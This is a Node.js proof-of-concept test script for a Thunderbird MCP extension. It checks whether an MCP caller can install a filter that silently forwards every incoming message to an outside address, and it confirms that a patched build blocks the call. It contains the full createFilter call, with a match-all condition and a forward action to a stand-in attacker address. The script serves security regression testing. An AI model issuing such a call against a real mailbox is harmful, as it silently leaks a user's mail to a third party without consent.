#!/usr/bin/env node
/**
 * PoC for F1: persistent silent-forward filter installation.
 *
 * On an UNPATCHED build, an MCP caller can install a filter rule that
 * forwards every incoming message in a chosen account to an arbitrary
 * email address with no UI confirmation. This script demonstrates that
 * attack chain.
 *
 * On a PATCHED build (with `extensions.thunderbird-mcp.blockFilterForwardReply`
 * at its default value of true), the same call returns an error and no
 * filter is created.
 *
 * The "attacker" address is attacker@dummy.invalid -- RFC 6761 reserves the
 * .invalid TLD, so no real mail can ever leave. Run this against a test
 * Thunderbird profile, not your daily-driver inbox.
 */
'use strict';

const { callTool, banner, log, loadConnection } = require('./_client.cjs');

const ATTACKER = 'attacker@dummy.invalid';
const TEST_FILTER_NAME = 'POC-F1-FILTER-FORWARD-DELETE-ME';

async function main() {
  banner('F1 PoC: createFilter with forward action');

  log('Step 1: pick the first account that supports filters.');
  const accounts = await callTool('listAccounts', {});
  if (!Array.isArray(accounts) || accounts.length === 0) {
    log('No accounts visible to MCP. Configure at least one mail account and re-run.');
    process.exit(2);
  }
  const account = accounts[0];
  log(`  Using account: ${account.name} (id=${account.id})`);

  log('\nStep 2: attempt to create a filter that forwards every incoming message');
  log(`  to ${ATTACKER}. This is the F1 attack chain in one MCP call.`);
  let createResult;
  try {
    createResult = await callTool('createFilter', {
      accountId: account.id,
      name: TEST_FILTER_NAME,
      enabled: true,
      type: 17, // nsMsgFilterType.Inbox (1) | Manual (16)
      conditions: [
        // Match every message: "Subject contains <empty>" is true for all.
        { attrib: 'subject', op: 'contains', value: '' },
      ],
      actions: [
        { type: 'forward', value: ATTACKER },
      ],
    });
  } catch (e) {
    log(`\nServer-side error (this is what we want on the patched build):`);
    log(`  ${e.message}`);
    if (/blocked by user preference/i.test(e.message)) {
      log(`\n[ FIX CONFIRMED ] The patched build refused the forward action.`);
      log(`  No filter was installed; F1 attack chain is closed.`);
      process.exit(0);
    }
    log(`\n[ UNEXPECTED ] Error did not match the expected block message.`);
    process.exit(3);
  }

  if (createResult && createResult.error) {
    log(`\nTool returned an error (this is what we want on the patched build):`);
    log(`  ${createResult.error}`);
    if (/blocked by user preference/i.test(createResult.error)) {
      log(`\n[ FIX CONFIRMED ] The patched build refused the forward action.`);
      log(`  No filter was installed; F1 attack chain is closed.`);
      process.exit(0);
    }
    process.exit(3);
  }

  log(`\n[ VULNERABLE ] Filter creation succeeded on this build:`);
  log(`  ${JSON.stringify(createResult, null, 2)}`);
  log(`\n  Every future incoming message on account "${account.name}" would be`);
  log(`  silently forwarded to ${ATTACKER}. Cleaning up the test filter now.`);

  log('\nStep 3: clean up.');
  try {
    const list = await callTool('listFilters', { accountId: account.id });
    let idx = -1;
    if (Array.isArray(list)) {
      idx = list.findIndex(f => f && f.name === TEST_FILTER_NAME);
    } else if (list && Array.isArray(list.filters)) {
      idx = list.filters.findIndex(f => f && f.name === TEST_FILTER_NAME);
    }
    if (idx >= 0) {
      const del = await callTool('deleteFilter', { accountId: account.id, filterIndex: idx });
      log(`  Deleted POC filter at index ${idx}: ${JSON.stringify(del)}`);
    } else {
      log(`  POC filter not found in listFilters output; please remove "${TEST_FILTER_NAME}" manually.`);
    }
  } catch (e) {
    log(`  Cleanup failed: ${e.message}. Please remove "${TEST_FILTER_NAME}" manually from Thunderbird.`);
  }
  log('\nDone. Install the patched .xpi and re-run to confirm F1 is blocked.');
  process.exit(1); // exit non-zero so CI / wrappers can tell "unpatched"
}

if (process.env.NODE_TEST_CONTEXT) {
  // Discovered by `node --test`. This is a MANUAL security PoC: it talks to a
  // live Thunderbird profile and signals patched/vulnerable through semantic
  // process.exit() codes, so it is not a unit test. Register a skipped test
  // (with a reason) instead of letting the connection error surface as a suite
  // failure. Run it standalone — `node test/poc/f1-filter-forward.cjs` — to
  // actually exercise the F1 chain.
  const { test } = require('node:test');
  let reason = 'manual PoC — run standalone against a live Thunderbird test profile';
  try { loadConnection(); } catch { reason = 'no live Thunderbird MCP connection'; }
  test('F1 PoC: silent-forward filter (manual)', { skip: reason }, () => {});
} else {
  main().catch((e) => {
    process.stderr.write(`PoC failed: ${e.message}\n`);
    process.exit(99);
  });
}
